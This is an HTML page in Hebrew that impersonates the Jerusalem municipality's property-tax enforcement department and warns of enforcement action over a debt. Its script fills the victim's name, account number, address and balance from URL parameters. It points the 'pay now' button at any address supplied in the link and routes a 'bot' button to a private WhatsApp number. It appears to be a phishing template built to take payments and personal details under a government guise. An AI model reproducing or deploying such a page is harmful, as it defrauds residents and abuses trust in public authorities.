<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>תשלום ארנונה</title>

<style>
  body {
    font-family: Heebo, Arial;
    background:#e8f0ff;
    margin:0;
    padding:0;
    color:#0d1b2a;
  }

  .wrap { max-width:900px; margin:auto; }

  /* HEADER שחור-זהוב */
  .header {
    background:black;
    color:white;
    padding:20px;
    display:flex;
    align-items:center;
    gap:16px;
    border-bottom:6px solid #d1a000;
  }

  .header svg { width:80px; height:80px; }

  .note {
    background:#fff3c8;
    border:1px solid #ffe29b;
    color:#5a4300;
    padding:12px;
    margin:18px 0;
    border-radius:12px;
    text-align:center;
    font-weight:700;
  }

  .card {
    background:white;
    padding:20px;
    border-radius:14px;
    box-shadow:0 4px 18px rgba(0,0,0,0.1);
  }

  .field {
    background:#f2f6ff;
    border:1px solid #d7e3ff;
    padding:12px;
    border-radius:10px;
    margin-bottom:12px;
  }

  .label { font-size:0.9rem; color:#55627a; }
  .value { font-weight:700; font-size:1.1rem; }

  .cta a {
    display:block;
    width:100%;
    text-align:center;
    padding:14px;
    margin:10px 0;
    border-radius:12px;
    font-weight:800;
    font-size:1.1rem;
    text-decoration:none;
  }

  .primary {
    background:#255bbf;
    color:white;
    border:2px solid #1b4a99;
  }

  .secondary {
    background:white;
    border:1px solid #cfe0f6;
    color:#255bbf;
  }

  .footer {
    background:#0f2748;
    color:white;
    padding:18px;
    text-align:center;
    margin-top:25px;
  }
</style>
</head>

<body>
<div class="wrap">

  <div class="header">
    <!-- שרטוט אריה זמני -->
    <svg viewBox="0 0 64 64">
      <rect x="6" y="6" width="52" height="52" rx="8" fill="#0a3f86" stroke="#d1a000" stroke-width="3"/>
      <path d="M32 18c4 0 7 3 7 7c2 1 4 3 4 6c0 4-3 7-6 7h-2l-1 4h-6l-1-4h-2
      c-3 0-6-3-6-7c0-3 2-5 4-6c0-4 3-7 7-7z" fill="#d1a000"/>
    </svg>

    <div>
      <b style="font-size:1.3rem;">מחלקת אכיפה — עיריית ירושלים</b><br>
      <small>תשלום ארנונה</small>
    </div>
  </div>

  <div class="card">

    <div class="note">⚠️ תזכורת לפני נקיטת הליכי אכיפה</div>

    <div class="field">
      <div class="label">שם תושב</div>
      <div id="name" class="value"></div>
    </div>

    <div class="field">
      <div class="label">מס' חשבון ארנונה</div>
      <div id="account" class="value"></div>
    </div>

    <div class="field">
      <div class="label">כתובת</div>
      <div id="address" class="value"></div>
    </div>

    <div class="field">
      <div class="label">גובה החוב (₪)</div>
      <div id="balance" class="value" style="color:#b71c1c;"></div>
    </div>

    <!-- כפתור תשלום -->
    <a id="paybtn" class="primary" target="_blank">💳 לתשלום עכשיו</a>

    <!-- נציג -->
    <a class="secondary" href="tel:026293333">
      ☎ מעבר לנציג — 
      <span style="direction:ltr; unicode-bidi:embed;">02-6293333</span>
    </a>

    <!-- בוט -->
    <a id="wa" class="secondary" target="_blank">🤖 ArnonaBot</a>

  </div>

  <div class="footer">
    אגף ארנונה – עיריית ירושלים<br>
    טלפון: <span style="direction:ltr; unicode-bidi:embed;">02-6293333</span>
  </div>

</div>

<script>
const url = new URL(window.location.href);
const val = x => url.searchParams.get(x) || "";

document.getElementById("name").textContent = val("name");
document.getElementById("account").textContent = val("account");
document.getElementById("address").textContent = val("address");
document.getElementById("balance").textContent = val("balance");

document.getElementById("paybtn").href = val("pay");

document.getElementById("wa").href =
  "https://wa.me/972559597593?text=שלום " + encodeURIComponent(val("name"));
</script>

</body>
</html>
